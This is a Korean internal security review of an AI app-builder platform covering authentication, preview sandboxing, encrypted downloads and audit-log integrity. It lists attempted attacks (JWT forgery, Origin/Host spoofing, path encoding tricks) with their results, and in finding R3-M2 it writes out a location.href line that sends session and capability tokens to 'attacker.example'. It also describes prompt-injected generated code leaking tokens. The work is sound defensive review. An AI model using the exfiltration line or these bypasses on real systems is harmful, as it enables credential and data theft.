# R3 독립 보안 리뷰 — P0-1·P0-2·P0-3·P0-4

- 대상: `main`. `6b9ea24`(P0 설계·계약)→HEAD(`5a76cfb`). 구현 커밋 `788c742`(P0-1), `d65e7fd`(P0-4), `d6916cf`·`5a76cfb`(P0-2·P0-3).
- 방법: 구현자 README·보고서·단위/E2E 통과는 판정 근거로 쓰지 않았다. 실행 중인 서비스(Keycloak 8080, Verdaccio 4873, MinIO 9000, deps 7100, policy 7200, mock 7300, agent 7400, studio 5173, preview 5174)와 실제 Chromium, 그리고 격리 인스턴스(임시 dataDir·임시 MinIO 버킷)에 직접 공격·우회를 시도했다. 재현 스크립트와 출력은 [`repro/r3/`](repro/r3/)에 있다.
- 인증: 테스트 사용자 토큰은 Keycloak auth-code+PKCE 플로우를 HTTP로 구동해 얻었다(`toi-studio`는 public client, direct grant 비활성 — [`repro/r3/lib.mjs`](repro/r3/lib.mjs)). 서비스 토큰은 client_credentials.
- 비파괴: 새 projectId·임시 사용자 자원만 사용했고 live 쓰기는 커밋하지 않았다(승인 게이트는 capability 발급까지만 검증). 변조·object-lock 실험은 임시 dataDir·임시 버킷에서만 했다. 공유 정책 레지스트리에 시험용 `customers2` API를 등록했다가 `apis.json`에서 제거해 복원했다(실행 중 인스턴스의 in-memory 사본은 재시작 전까지 남으며 동일 upstream을 가리키는 무해한 추가 항목이다).
- 비밀값: 어떤 출력·문서에도 원문을 남기지 않았다(길이·일치 여부만). `.env`(0600)의 시크릿 값이 evals/bench/repro 산출물 383개에 유출됐는지 스캔 → **0건**.
- 표기: `검증 여부`는 **직접 재현함** 또는 **코드로만 판단**. 추측성 영향은 심각도를 한 단계 낮췄다.

## 요약

전반적으로 R1·R2의 critical/high가 모두 닫혔고, P0-1(식별·멤버십·4-eyes)과 P0-3(암호화 다운로드·서명 URL) 경계는 시도한 모든 우회를 막았다. **critical·high 신규 발견은 없다.** medium 2건, low 2건.

| ID | 심각도 | 영역 | 한 줄 근거 | 검증 |
|---|---|---|---|---|
| R3-M1 | medium | P0-3 감사 | 아직 MinIO로 복제되지 않은 감사 로그 **꼬리(tail)**를 clean하게 잘라내고 재시작하면 탐지되지 않는다(외부 high-water 앵커 없음). 복제된 구간·중간 변조·미완행 잘라내기는 탐지됨. | 직접 재현함(격리) |
| R3-M2 | medium | P0-2 프리뷰 | 프리뷰 CSP가 top-level **내비게이션**을 통제하지 못한다. 생성 코드가 `location.href` 자기 이동으로 `__TOI_FETCH_CONFIG__`(viewer 세션·capability 토큰)와 마스킹된 화면 데이터를 외부로 단방향 유출할 수 있다(`window.open`·`<a target>`·form은 sandbox+CSP로 차단됨). | 직접 재현함(실제 Chrome) |
| R3-L1 | low | P0-3 감사 | 감사 버킷은 object lock이 켜져 있으나 세그먼트 업로드 시 per-object retention을 설정하지 않아 WORM이 실제로 강제되지 않는다. 삭제 방지는 정책 사용자의 `s3:DeleteObject` 부재 + IfNoneMatch + verify 탐지로 보완됨. | 직접 재현함(격리) |
| R3-L2 | low·코드로만 판단 | P0-2 프리뷰 | 프리뷰 CSP `script-src`에 `data:`가 있고(번들 로드용) nonce가 `.nonce` IDL로 동일 출처 코드에 읽힌다. 다만 `connect-src`/`img-src` 잠금으로 추가 스크립트 실행이 새 권한을 주지 못한다(유출은 R3-M2 채널로 한정). | 코드로만 판단(+실행 관찰) |

R1·R2 회귀: C1·H1·H2·M1·M2·M3·N1~N5·L1~L7 **모두 유지(재발 없음)**. 상세는 §4.

---

## 1. 신규 발견

### R3-M1 · (medium) 미복제 감사 tail의 clean 잘라내기가 재시작 후 탐지되지 않음
관련: `services/policy-proxy/src/audit.ts:37-58`(`init`/`verify`), `:82-92`(라인 검증·seq/prevHash 재계산), `:113-127`(`flush`: `segmentSize` 또는 `intervalMs`마다 복제), `services/policy-proxy/src/main.ts`(기본 `segmentSize=1000`, `intervalMs=300000`)

- **실패 시나리오**: 감사 해시 체인은 실행 중에는 in-memory `records.length`로 진실 길이를 알기 때문에 라이브 변조·중간 삭제·미완행 잘라내기를 모두 잡는다(§아래 재현에서 확인). 그러나 **재시작 시** `verify()`는 파일과 MinIO에 복제된 세그먼트 목록만 앵커로 쓴다. 아직 복제되지 않은 꼬리(기본값 기준 최근 <1000건 또는 <5분치)를 온전한 라인 경계로 잘라내고(마지막 개행 유지) 프로세스를 재시작하면, 남은 체인은 seq 1..k가 일관되고 복제 세그먼트도 그대로여서 `verify()`가 `ok`를 반환한다. 즉 감사 로그의 **끝부분 무통보 삭제**가 가능하다. 감사의 목적(변조·삭제 tamper-evidence)을 이 창(window)에서 무력화한다.
- **전제·경계**: 공격자가 policy dataDir에 쓰기 권한이 있고 프로세스를 재시작(또는 다음 재시작을 기다림)할 수 있어야 한다. 이는 감사 설계가 상정한 위협(호스트 접근 내부자 → 그래서 별도 MinIO·object lock·삭제 불가 사용자를 둔다)에 포함된다. **복제 경계 아래로 자르면 탐지된다**(아래 재현 2). 따라서 노출은 미복제 tail로 한정된다 → high가 아닌 medium.
- **직접 재현함**:
  - [`repro/r3/p03-audit.mts`](repro/r3/p03-audit.mts) → [출력](repro/r3/p03-audit.out): 격리 임시 dataDir. 5건 기록 후 마지막 2줄을 온전히 제거하고 새 `AuditChain().init()` → `verify.ok=true brokenAt=undefined recordsVisible=3`. 대조: 바이트 변조 → `brokenAt=3`, 미완행 잘라내기 → `brokenAt=1`, 50건 동시 append → seq 1..50 유일·연속, 손상 후 append는 `AUDIT_CHAIN_BROKEN`(fail-closed).
  - [`repro/r3/p03-audit-minio.mts`](repro/r3/p03-audit-minio.mts) → [출력](repro/r3/p03-audit-minio.out): 임시 object-lock 버킷에 seq 1..5 세그먼트를 복제한 뒤 파일을 4건으로 자르고 재시작 → `verify.ok=false brokenAt=5`(복제 구간 아래는 탐지됨).
- **왜 테스트가 못 잡나**: 단위 테스트는 라이브 변조와 복제된 세그먼트 위주다. 재시작+미복제 tail 조합의 음성 케이스가 없다.
- **권장 수정**: 재시작 시 검증할 수 있는 외부 앵커를 둔다. 예) (a) 응답 전에 마지막 seq/hash를 object-lock 버킷의 고정 키에 자주(또는 매 append 배치마다) 기록하고 `init`에서 파일 길이가 그보다 짧으면 `brokenAt`; (b) 종료 시그널·주기적으로 `flush(true)`를 강제해 미복제 창을 줄인다; (c) `segmentSize`/`intervalMs`를 낮춰 창을 축소.
- **담당**: `services/policy-proxy`

### R3-M2 · (medium) 프리뷰 CSP가 top-level 내비게이션을 막지 못해 생성 코드가 세션·capability 토큰과 마스킹 데이터를 단방향 유출
관련: `apps/studio/scripts/security.mjs:10-21`(프리뷰 CSP — `navigate-to`/네비게이션 통제 없음), `packages/preview-runtime/src/index.ts:94`(`sandbox.add('allow-scripts','allow-same-origin')`), `packages/preview-runtime/src/frame.ts:39-44`(`__TOI_FETCH_CONFIG__`를 프레임 전역으로 주입)

- **실패 시나리오**: 프리뷰 프레임의 생성 코드(또는 프롬프트 인젝션으로 유도된 코드)는 `globalThis.__TOI_FETCH_CONFIG__`(viewer `sessionToken` + `capabilityToken` + projectId + proxyBaseUrl)를 읽을 수 있다(설계상 `@toi/fetch`가 이 전역을 읽는다; `Object.freeze`는 읽기를 막지 않는다). CSP는 `connect-src http://localhost:7200`로 fetch/XHR/WebSocket/beacon을, `img-src data: blob:`로 이미지 비콘을, `form-action 'none'`로 폼을 막는다(§2에서 실제 Chrome으로 전부 차단 확인). 그러나 CSP에는 `navigate-to`가 없고(브라우저 미지원 지시자) 프레임 sandbox에도 자기 이동을 막는 플래그가 없어, `location.href = 'http://attacker.example/?d=' + encodeURIComponent(JSON.stringify(__TOI_FETCH_CONFIG__))` 한 줄이 프레임을 외부로 이동시키며 쿼리스트링에 실린 토큰·데이터를 공격자 서버로 보낸다.
- **경계(영향 하향 근거)**: (1) 유출되는 데이터는 프록시가 이미 **마스킹**한 값이다(원문 PII 아님). (2) 토큰은 viewer·read 범위, projectId·sub 바인딩, 짧은 exp(write는 사용자가 명시 허용했을 때만, preview env, ≤120초, apiIds 한정). (3) 정책 프록시는 loopback(`127.0.0.1:7200`) 바인딩이고 `/proxy`는 프리뷰 Origin/스튜디오 Origin만 허용하므로, 외부로 유출한 토큰을 외부에서 재생(replay)하기는 배포 형태상 어렵다(Origin 헤더는 비브라우저 클라이언트가 위조 가능하나 프록시 도달성이 필요). 따라서 실질 영향은 마스킹 데이터·단기 범위 토큰의 단방향 유출로 제한 → high가 아닌 medium. 또한 프레임이 실제로 이동하므로 사용자에게 프리뷰가 깨져 보인다(완전 은닉은 아님).
- **직접 재현함**(실제 Chromium, 프로덕션과 동일한 `sandbox="allow-scripts allow-same-origin"`):
  - [`repro/r3/p02-browser.mjs`](repro/r3/p02-browser.mjs) → [출력](repro/r3/p02-browser.out): 프리뷰 프레임 안 생성 코드의 fetch(외부/7400/상대경로)·img·beacon·WebSocket·prefetch가 전부 CSP로 차단되고 로컬 수신기(:9876) 히트 **0건**, `window.open`→null, 부모/top DOM 접근 SecurityError, 프로젝트 A·B origin 분리, BroadcastChannel 교차 없음. (CSP가 `document.open/write` 이후에도 유효함은 이 코드가 write 이후 실행되며 전부 차단되는 것으로 확인.)
  - [`repro/r3/p02-nav-egress.mjs`](repro/r3/p02-nav-egress.mjs) → [출력](repro/r3/p02-nav-egress.out): 동일 sandbox에서 `location.href`→**수신기 도달**(유출 성공), `window.open`·`<a target=_blank>`·form GET→차단(수신기 미도달).
- **권장 수정**: (a) 유출 가능한 크리덴셜을 프레임에 넣지 않는 것이 근본책 — 프레임이 토큰을 갖지 않고 부모(스튜디오)가 postMessage 브로커로 프록시 요청을 대행. (b) 차선으로 프레임 자기 이동을 감지·차단(예: `beforeunload` 신뢰 불가하므로 한계), write capability는 기본 미주입 유지, capability TTL을 짧게 유지, 프록시를 외부 비노출 유지. (c) 설계 문서(`contracts/src/runtime.ts:123-136`)의 CSP 요구에 내비게이션 exfil 잔여 위험을 명시.
- **담당**: `packages/preview-runtime`, `apps/studio`

### R3-L1 · (low) 감사 버킷 object lock이 켜져 있으나 세그먼트에 retention을 설정하지 않아 WORM 미강제(IAM·IfNoneMatch·탐지로 보완)
관련: `scripts/storage.mjs:21`(`mc mb --with-lock`), `:38-39`(lock enabled 확인), `services/policy-proxy/src/objects.ts:13-16`(`put`은 `IfNoneMatch:'*'`만, `ObjectLockRetainUntilDate`/`ObjectLockMode` 미설정)

- **실패 시나리오**: 버킷에 object lock이 enabled지만, 업로드되는 세그먼트 객체에 retention 기간이나 legal hold, 버킷 기본 retention이 없다. object lock은 retention이 걸린 객체만 보호하므로, 삭제·덮어쓰기 권한이 있는 주체(예: MinIO root/admin)는 세그먼트를 지울 수 있다. "object lock 적용"이라는 표현과 실제 보호 사이에 간극이 있다.
- **보완(그래서 low)**: policy-proxy가 쓰는 **범위 제한 MinIO 사용자**는 감사 버킷에 `s3:DeleteObject`가 없다(→ 실제 AccessDenied 확인). 덮어쓰기는 `IfNoneMatch:'*'`로 막힌다. 원격 세그먼트가 사라지면 `verify()`가 `brokenAt`으로 탐지한다(§R3-M1 재현 2). 즉 앱 신원으로는 삭제 불가 + 탐지됨.
- **직접 재현함**: [`repro/r3/p03-audit-minio.mts`](repro/r3/p03-audit-minio.mts) → [출력](repro/r3/p03-audit-minio.out): 임시 object-lock 버킷에 retention 없이 PUT한 객체를 root로 `DeleteObject` → **DELETED**. 실행 중 감사 버킷에 정책 사용자로 `DeleteObject`(존재하지 않는 키) → **AccessDenied http=403**; 다운로드 버킷 → 허용(정리용).
- **권장 수정**: `put` 시 감사 세그먼트에 `ObjectLockMode: 'COMPLIANCE'` + retention(≥ 보존기간)을 설정하거나 버킷 기본 retention을 구성한다. R3-M1의 외부 앵커와 함께 다루면 tail 삭제 탐지까지 보강된다.
- **담당**: `services/policy-proxy`, `scripts/storage.mjs`

### R3-L2 · (low, 코드로만 판단) 프리뷰 CSP `script-src data:`와 nonce IDL 노출
관련: `apps/studio/scripts/security.mjs:13`(`script-src 'self' http://localhost:7100 data: 'nonce-…'`), `packages/preview-runtime/src/frame.ts:22-23`(번들을 `data:` 모듈로 import), `:30,40-41`(nonce)

- 번들을 `data:` 모듈로 로드하기 위해 `script-src`에 `data:`가 있다. 이는 임의 스크립트 실행 표면을 넓히지만, `connect-src`(7200만)·`img-src`(data:/blob:만)·`default-src 'none'` 잠금 때문에 주입된 `data:` 스크립트도 새 유출 경로를 얻지 못한다(유일한 단방향 유출은 R3-M2의 내비게이션). nonce는 `document.write` 이후 메타 태그가 사라지지만 `.nonce` IDL로 동일 출처 코드가 읽을 수 있어 추가 nonce 스크립트를 주입할 수 있으나, 이미 임의 JS를 실행 중인 코드에 새 권한을 주지 않는다.
- **코드로만 판단**(+ §2 실행 관찰에서 상대경로 fetch·외부 fetch 차단 확인).
- **권장**: 가능하면 번들을 blob:로 로드하고 `script-src`에서 `data:`를 제거하는 방안을 검토(설계 tradeoff이므로 필수 아님).

---

## 2. P0 영역별 커버리지(시도 → 결과)

시도한 공격 중 §1 외에는 모두 **막혔다**. 근거 출력은 각 스크립트에 있다.

### P0-1 식별·권한 — 이상 없음
[`p01-jwt.mjs`](repro/r3/p01-jwt.mjs)/[out](repro/r3/p01-jwt.out), [`p01-authz.mjs`](repro/r3/p01-authz.mjs)/[out](repro/r3/p01-authz.out), [`p01-approvals.mjs`](repro/r3/p01-approvals.mjs)/[out](repro/r3/p01-approvals.out), [`p01-config.mts`](repro/r3/p01-config.mts)/[out](repro/r3/p01-config.out)

| 시도 | 결과 |
|---|---|
| JWT `alg=none` platform-admin 위조 | 401 SESSION_REQUIRED |
| HS256 혼동(공개키 SPKI/모듈러스를 HMAC 키로) | 401 |
| 공격자 RS256 키 + 실제 kid / jku·jwk 헤더 주입(JWKS 오염) | 401 (algorithms RS256 고정, JWKS만 신뢰) |
| 만료 토큰(재서명), 빈/쓰레기 bearer | 401 |
| 서비스 토큰(policy-proxy·agent)으로 사용자 API 호출 | 403 USER_IDENTITY_REQUIRED |
| agent 서비스 토큰으로 agent internal 멤버십 | 403(policy-proxy 서비스만) |
| policy 서비스 토큰 + 스튜디오 Origin으로 internal 멤버십 | 403(origin 없어야 함) |
| 비멤버의 멤버십·프로젝트·`/audit` 조회 | 404(존재 미노출, 타이밍 차 없음) |
| editor의 owner 전용(멤버 변경) | 403 |
| 마지막 owner 자기 강등 | 409 last owner required |
| 역할 강등 직후(캐시 없음) write preview-session | 403 PROJECT_ROLE_FORBIDDEN(즉시 반영) |
| preview-session: 프리뷰 Origin/Origin 없음/ttl>120 | 403 ORIGIN_FORBIDDEN / 403 STUDIO_ORIGIN_REQUIRED / 400 |
| capability 교차: sub 불일치 / projectId 불일치 / 헤더 project 위조 | 403 CAPABILITY_INVALID / PREVIEW_ORIGIN_MISMATCH |
| preview read capability + `X-Toi-Env: live` | 403 ENV_MISMATCH |
| 4-eyes: 본인 승인 / 비 api-owner 승인 / 승인 재결정 | 403 FOUR_EYES_REQUIRED / 403 API_OWNER_REQUIRED / 409 |
| live write capability: 미승인 api / 교차 프로젝트 / 부분 apiIds | 403 LIVE_APPROVAL_REQUIRED |
| 승인 만료(TTL 경과) 후 capability | 403 LIVE_APPROVAL_REQUIRED(fail-closed) |
| 운영 config 가드: `production`·`Production`·`prod`·`staging`·`""`·미설정 + 기본/단/중복 시크릿·dev-auth·dev-admin-token | 전부 REJECTED (N5 fail-open 수정됨). dev 세션 발급은 코드에서 제거(`devAuth` 상수 false, `/dev/session`→404) |
| 스튜디오 OIDC | PKCE(S256), state/nonce, 토큰 in-memory 저장(웹스토리지 잔류 없음), `prompt=none` 루프 가드(`toi-sso-attempted`), returnTo open-redirect 검증, 로그아웃 epoch 가드 — 코드 확인 |

### P0-2 프리뷰 격리 — R3-M2/L2 외 이상 없음
[`p02-browser.mjs`](repro/r3/p02-browser.mjs)/[out](repro/r3/p02-browser.out), [`p02-nav-egress.mjs`](repro/r3/p02-nav-egress.mjs)/[out](repro/r3/p02-nav-egress.out), [`p02-origin.mjs`](repro/r3/p02-origin.mjs)/[out](repro/r3/p02-origin.out), [`p02-env-allowlist.out`](repro/r3/p02-env-allowlist.out)

| 시도 | 결과 |
|---|---|
| 외부 fetch/XHR/WebSocket/beacon/img/prefetch (실제 Chrome, sandbox) | 전부 CSP 차단, 로컬 수신기 0건 |
| 7400·상대경로 fetch | connect-src 위반 차단 |
| 7200 fetch | connect-src 허용(정상 경로) |
| top-level 내비게이션 exfil(`location.href`) | **유출됨 → R3-M2** |
| `window.open`·`<a target>`·form 내비게이션 | sandbox+CSP 차단 |
| 부모/top DOM·타 프로젝트 storage 접근 | SecurityError / 미접근(origin 분리) |
| 프로젝트 A·B origin 분리, BroadcastChannel 교차 | 분리됨, 교차 없음 |
| CSP `document.open/write` 이후 유지 | 유지(write 이후 코드의 요청이 차단됨) |
| `/proxy` Origin 변형(대문자·포트생략/오기·후행 점·suffix hijack·추가 서브도메인·null) | 전부 403 ORIGIN_FORBIDDEN; 다른 uuid → PREVIEW_ORIGIN_MISMATCH |
| X-Toi-Project와 세션/capability 불일치 | 403 PREVIEW_ORIGIN_MISMATCH |
| 5174 Host 변형(대문자·후행점·suffix rebinding·포트누락·IPv6·plain localhost·bad uuid·추가 라벨) | 전부 421 Misdirected; 정확 lowercase만 200 |
| env allowlist(`ps eww`) | policy-proxy만 세션/capability/kek/urlSecret/minio 보유; agent-server·mock-backend·deps-builder에 불필요 시크릿 없음(L6 수정됨) |
| `data:` 모듈 CSP | R3-L2 참조(유출 경로 아님) |

### P0-3 다운로드·감사 — R3-M1/L1 외 이상 없음
[`p03-downloads.mjs`](repro/r3/p03-downloads.mjs)/[out](repro/r3/p03-downloads.out), [`p03-units.mts`](repro/r3/p03-units.mts)/[out](repro/r3/p03-units.out), [`p03-audit.mts`](repro/r3/p03-audit.mts)/[out](repro/r3/p03-audit.out), [`p03-audit-minio.mts`](repro/r3/p03-audit-minio.mts)/[out](repro/r3/p03-audit-minio.out)

| 시도 | 결과 |
|---|---|
| 서명 URL: exp 변조 / sig 변조 / sig 누락 / 중복 파라미터 | 전부 403 DOWNLOAD_SIGNATURE_INVALID |
| 다른 사용자 토큰으로 fetch | 404 DOWNLOAD_NOT_FOUND(requestedBy 바인딩) |
| 프리뷰 Origin에서 fetch / 무인증 | 403 ORIGIN_FORBIDDEN / 401 |
| 1회성: 동시 두 요청 | [200,410]; 3번째 410 GONE |
| MinIO 다운로드 객체 평문 여부 | 암호문(602B, 마스킹 PII 마커 없음) |
| fetch 후 MinIO 객체 | 삭제됨(NoSuchKey) |
| ZIP 방식 | AE-2, strength=3(AES-256), encrypted bit set |
| 봉투: 데이터 키 재사용·IV 재사용 | 매번 새 데이터 키·IV(distinct), fresh wrappedDataKey |
| GCM 태그 / AAD(context) / KEK 검증 | 변조·잘못된 context·잘못된 KEK 모두 거부 |
| CSV 수식 주입(`= + - @`, 선행 tab/CR/space) | 선행 `'`로 무력화 + 큰따옴표 escape |
| XLSX 수식 | ExcelJS가 문자열로 저장(`<f>` 없음) — 주입 안 됨 |
| 행 한도 | 10001 → 413 DOWNLOAD_ROW_LIMIT, 10000 ok |
| 다운로드 경로 마스킹 | `/proxy`와 동일 마스킹 후 생성(server.ts:99-102) |
| 감사 canonicalJson 모호성 | 키 순서 무관, 문자열↔구조 구분, undefined 제거 — 충돌 없음 |
| 동시 append seq | 50건 유일·연속, verify ok(직렬화) |
| fsync | `durableWrite`가 `fd.datasync()` 호출(코드 확인) |
| 바이트 변조 / 중간 삭제 / 미완행 잘라내기 | 전부 `brokenAt` 탐지, 이후 append fail-closed |
| 복제 세그먼트 아래 잘라내기 | 탐지(brokenAt) |
| **미복제 tail clean 잘라내기 + 재시작** | **미탐지 → R3-M1** |
| 세그먼트 덮어쓰기 | `IfNoneMatch:'*'`(생성 전용), 불일치 시 brokenAt |
| object lock 실제 강제 | retention 미설정 → R3-L1(정책 사용자 삭제 불가·탐지로 보완) |
| policy MinIO 사용자 권한 | 감사 버킷 DeleteObject → AccessDenied, 다운로드는 허용 |

### P0-4 평가·드라이버 — 이상 없음
[`p04-json.mts`](repro/r3/p04-json.mts)/[out](repro/r3/p04-json.out)

| 시도 | 결과 |
|---|---|
| `json-content` 파싱: 프로즈 내 임베드 객체·여러 객체·배열·추가 키·중첩 코드펜스·인젝션 지시문 | 전부 REJECTED(전체를 한 개 JSON으로만 파싱, 임베드 추출 안 함) |
| 유니코드 이스케이프 tool 이름 | name+arguments만 허용, tool spec 재검증 통과 후 사용 |
| 평가 하네스가 비밀값을 결과 파일에 남기는지 | evals/bench/repro 383개 스캔 → 유출 0 |
| 인젝션 케이스 정책 차단 | eval security 프로브: rawFetch 소스 400, noCapability 403, unregistered 404, readCap write 403, missingReason 428(정책 계층이 실제 차단). computed-alias 소스 통과는 텍스트 가드 한계로 정직히 명시(CSP가 실제 방어) |
| agent-server Origin(N1) | 프리뷰/미지 Origin → 403, 변이에 JSON content-type 강제(§4 N1) |

---

## 3. 관찰: 프리뷰 데이터 정책은 계속 유효
`/proxy`는 마스킹(name/phone/email/rrn/account)을 적용하고 조회 사유를 요구하며, capability·멤버십·환경(preview/live)·역할을 매 요청 재평가한다([`p05-regression.mjs`](repro/r3/p05-regression.mjs)/[out](repro/r3/p05-regression.out)에서 마스킹·경로 검증 확인). R3-M2는 이 경계 자체를 깨지 않는다 — 유출되는 것은 이미 마스킹된 데이터와 단기 viewer 토큰이다.

## 4. R1/R2 회귀 판정표

| ID | R1/R2 심각도 | R3 판정 | 근거 |
|---|---|---|---|
| C1 (프리뷰 임의 역할 세션 발급) | critical | **유지** | dev 세션 발급이 코드에서 제거됨(`config.ts` `devAuth` 상수 false, `/dev/session`→404). 프리뷰 Origin의 `/preview-sessions`·`/capabilities`는 403. (p01-authz, p01-config) |
| H1 (운영 기본 시크릿·dev 세션) | high | **유지** | production 가드가 기본/단/중복 시크릿·dev-auth·dev-admin-token 거부. `.env` 0600. 위조 토큰 401. (p01-config, p01-jwt) |
| H2 (이중 인코딩 경로 우회) | high | **유지** | 이중 인코딩·`%2f`·백슬래시·NUL·overlong·`;`·후행 점 전부 400/404. upstream 도달 없음. (p05-regression) |
| M1 (마스킹 변형) | medium | **유지** | 등록 필드 마스킹 정상, 미등록 문자열 잔여 스캔 동작. (p05-regression) |
| M2 (등록 데이터 프롬프트 인젝션) | medium | **유지** | `untrusted_api_registry_data` 래핑 + CSP가 실제 egress 방어. 텍스트 가드 한계는 eval에 정직히 기록. |
| M3 (deps single-flight) | medium | **유지** | 범위 밖(이번 P0 변경 없음). R2 판정 유지. |
| N1 (프리뷰→agent-server 무인증 단순 요청) | medium | **유지(수정됨)** | agent-server가 스튜디오 외 Origin 403 + 변이 JSON 강제(`server.ts:34,43-46`). 프리뷰 CSP `connect-src`도 7400 미포함. (p01-jwt, p02-browser) |
| N2 (ISO 날짜 계좌 오탐) | medium(회귀) | **유지(수정됨)** | `nonPiiTokens`가 ISO 날짜·UUID·13자리·소수 제외. orders.createdAt 미마스킹 확인. (p05-regression) |
| N3 (upstream base 경로 접두사 소실) | medium(회귀) | **유지(수정됨)** | `server.ts:86`이 base pathname 접두사 보존. dataset=preview 확인. (p05-regression) |
| N4 (`;`·세그먼트 끝 `.` 원문 전달) | medium(조건부) | **유지(수정됨)** | `normalizePath`가 NFKC 후 `;`·`\.$` 세그먼트 거부 → 400. (p05-regression) |
| N5 (운영 가드 정확 일치 fail-open) | medium | **유지(수정됨)** | 가드가 opt-in dev(`development`/`test`)만 예외, 그 외 모든 NODE_ENV에 적용. (p01-config) |
| L1 (숫자 PII·보조 탐지 한계) | low | **유지** | 등록 pointer가 문자열·숫자 모두 마스킹(mask.ts:59). 잔여 스캔은 문자열만 — 설계상 보조. |
| L2 (텍스트 가드 우회 + CSP 부재) | low | **유지(개선)** | CSP 도입으로 egress 방어가 실제화(잔여는 R3-M2 내비게이션). |
| L3 (비ASCII 경로 파라미터 400) | low(회귀) | **유지(수정됨)** | 경로 변수 정규식이 `-\u{10ffff}` 허용. 한글 경로 → upstream 도달(404). (p05-regression) |
| L4 (대용량 응답 이벤트 루프 차단) | low | **유지** | 다운로드 행 한도 10000. 프록시 응답 상한은 범위 밖. |
| L5 (deps cleanup/store 무응답) | low | **유지** | 범위 밖(P0 변경 없음). |
| L6 (자식 프로세스에 전체 env 전달) | low | **유지(수정됨)** | 서비스별 env allowlist(`service-env.mjs`). agent·mock에 세션/capability 시크릿 없음. mock-backend 기본 토큰 fallback 제거·distinct 강제. (p02-env-allowlist) |
| L7 (프리뷰 origin 공유·스튜디오 framable) | low | **유지(수정됨)** | 프로젝트별 origin(`p-<uuid>.preview.localhost`), 스튜디오 `frame-ancestors 'self'`+`X-Frame-Options: SAMEORIGIN`. (p02-browser, p02-origin) |

## 5. 머지 판단

**남은 critical/high: 없음.**

- R1(C1)·R1/R2 high(H1·H2)와 N1~N5 회귀는 실행 중 서비스·실제 Chrome·격리 인스턴스 공격에서 모두 막혔거나 수정됐다.
- 신규는 medium 2건, low 2건이다. 어느 것도 데이터 정책 경계(마스킹·조회 사유·capability·환경 분리·4-eyes)를 깨지 않는다.

→ **P0 범위 종료 가능.** medium 2건은 후속 과제로 추적한다.

| 우선 | ID | 이유 |
|---|---|---|
| 1 | R3-M1 (medium) | 감사 무결성의 명시 목표(잘라내기 탐지)를 미복제 tail 창에서 무력화. 외부 앵커/강제 flush로 닫힘. R3-L1과 함께 다루면 감사 WORM이 완성된다. |
| 2 | R3-M2 (medium) | CSP 격리의 exfil 봉쇄 목표를 내비게이션이 우회. 영향은 마스킹 데이터·단기 토큰으로 제한되나, write capability 유출 창이 있으므로 브로커 패턴 검토 권장. |
| 3 | R3-L1 · R3-L2 (low) | object lock retention 실제 설정, `data:` script-src 축소 검토. |

INTENT("데이터 정책을 AI가 아니라 플랫폼이 보장한다")는 P0-1·P0-3 경계에서 R3 시점에 성립한다. P0-2 프리뷰는 격리·egress 봉쇄가 대폭 강화됐고, 남은 것은 내비게이션 exfil(마스킹 데이터·단기 토큰)과 감사 tail 앵커라는 두 medium 보강이다.
